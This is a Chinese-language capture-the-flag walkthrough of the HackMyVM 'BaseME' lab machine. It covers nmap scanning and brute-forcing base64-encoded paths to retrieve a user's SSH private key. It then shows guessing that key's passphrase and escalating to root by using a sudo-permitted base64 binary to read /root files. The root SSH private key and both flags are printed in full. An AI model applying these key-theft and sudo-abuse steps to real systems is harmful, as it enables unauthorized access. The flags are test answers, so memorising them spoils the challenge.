# BaseME

:::note

[Linux VM] [Tested on VirtualBox] created by || sml

⏲️ Release Date // 2020-09-28

✔️ MD5 // b0caa5afd0944933daa1525c0ceb6bf3

☠ Root // 221

💀 User // 219

📝Notes //
CTF like. Tested on VBox.

:::

## 靶机启动

![靶机启动](img/image_20231242-104224.png)

靶机 IP：

```plaintext
192.168.56.107
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.107
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 ca0980f73ada5ab619d95c414743d410 (RSA)
|   256 d0754848b8265937643b257f2010f870 (ECDSA)
|_  256 9114f7930b0625cbe0a530e8d3d3372b (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:09:C2:C2 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 探测 web 服务

Chrome 直接访问

![Chrome 直接访问](img/image_20231244-104443.png)

查看原始返回

```shell
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-BaseME]
└──╼ $http get http://192.168.56.107/
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html
Date: Sat, 23 Dec 2023 02:45:08 GMT
ETag: W/"5f718f77-114"
Last-Modified: Mon, 28 Sep 2020 07:23:35 GMT
Server: nginx/1.14.2
Transfer-Encoding: chunked

QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK

<!--
iloveyou
youloveyou
shelovesyou
helovesyou
weloveyou
theyhatesme
-->
```

将返回的数据进行 base64 解码

```plaintext title="base64 decode"
ALL, absolutely ALL that you need is in BASE64.
Including the password that you need :)
Remember, BASE64 has the answer to all your questions.
-lucas
```

常规目录爆破，未发现有价值信息

尝试将常规的目录扫描字典 base64 encode 之后，将其作为字典进行扫描

:::warning 题目的 base64 有特殊问题

如果使用 python 进行处理，会因为解码后的数据缺少 `0x0a` 而出现问题

```python
import base64

with open("./dic.txt", "r") as f:
    dic = f.read()

dic = [i for i in dic.split("\n") if i != ""]

res = []

for i in dic:
    res.append(base64.b64encode((i+".").encode()).decode())

with open("./dic-base64.txt", "w+") as f:
    f.write("\n".join(res))
```

建议使用 bash 脚本进行处理

:::

```shell
while IFS= read -r linea
do
   echo $linea | base64 >> $2
done < $1
```

然后利用处理后的字典进行爆破

```shell
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-BaseME]
└──╼ $dirsearch -w dic-base64.txt -u http://192.168.56.107/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4614

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/192.168.56.107/-_23-12-23_11-09-00.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-12-23_11-09-00.log

Target: http://192.168.56.107/

[11:09:00] Starting:
[11:09:02] 200 -    2KB - /aWRfcnNhCg==
[11:09:03] 200 -   25B  - /cm9ib3RzLnR4dAo=
```

将两个文件名解码后得到

```plaintext
id_rsa
robots.txt
```

将文件下载到本地, base64 解码后进行查看

```plaintext title="id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL
BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1
cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG
07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh
7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv
f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4
vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X
YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK
xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs
+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi
NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ
zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0
IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI
pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ
MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp
+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV
tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh
i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+
tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw
N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM
Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ
O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2
TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl
3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL
ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ
LdmmRXUS/DtO+69/aidvxGAYob+1M=
-----END OPENSSH PRIVATE KEY-----
```

```plaintext title="robots.txt"
Nothing here :(
```

## SSH 私钥利用

尝试直接使用

```shell
┌─[✗]─[randark@randark-Parrot]─[~/tmp/HackMyVM-BaseME]
└──╼ $ssh lucas@192.168.56.107 -i id_rsa
Enter passphrase for key 'id_rsa':
```

根据已得到的信息，只有 html 返回的数据内的备注信息还没有利用，尝试 base64 编码后进行尝试

```plaintext
aWxvdmV5b3UK
eW91bG92ZXlvdQo=
c2hlbG92ZXN5b3UK
aGVsb3Zlc3lvdQo=
d2Vsb3ZleW91Cg==
dGhleWhhdGVzbWUK
```

经过尝试，密码为

```plaintext
aWxvdmV5b3UK
```

成功登录 SSH

```shell
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-BaseME]
└──╼ $ssh lucas@192.168.56.107 -i id_rsa
Enter passphrase for key 'id_rsa':
Linux baseme 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 28 12:51:36 2020 from 192.168.1.58
lucas@baseme:~$
```

## user pwned

```shell
lucas@baseme:~$ cat user.txt
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,

HMV8nnJAJAJA
```

## 尝试提权

```plaintext title="sudo -l"
Matching Defaults entries for lucas on baseme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucas may run the following commands on baseme:
    (ALL) NOPASSWD: /usr/bin/base64
```

```plaintext title="getcap -r / 2>/dev/null"
None
```

```plaintext title="find / -perm -u=s -type f 2>/dev/null"
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

发现 `base64` 可以实现任意文件读取

## root pwned

使用 `base64` 直接读取 `root.txt` 的文件内容

```plaintext title="/root/root.txt"
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,

HMVFKBS64
```

## 后记

当然，也可以通过读取 root 用户的 SSH 私钥，从而登陆上 root 账户的 SSH

```plaintext title="/root/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2B
IdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxp
DEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk
/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7
px+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9a
S+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ
7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRx
YQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8v
zEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO
4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpig
yLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6
oBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5
SEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDr
nCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9R
iMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLq
vWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oG
ptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuz
X2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axR
fKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExD
SiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCe
FWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5
rFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIR
txBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an
2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=
-----END OPENSSH PRIVATE KEY-----
```

成功登录

```shell
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-BaseME]
└──╼ $ssh root@192.168.56.107 -i id_rsa-root 
Linux baseme 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 28 12:47:13 2020 from 192.168.1.59
root@baseme:~# whoami
root
```
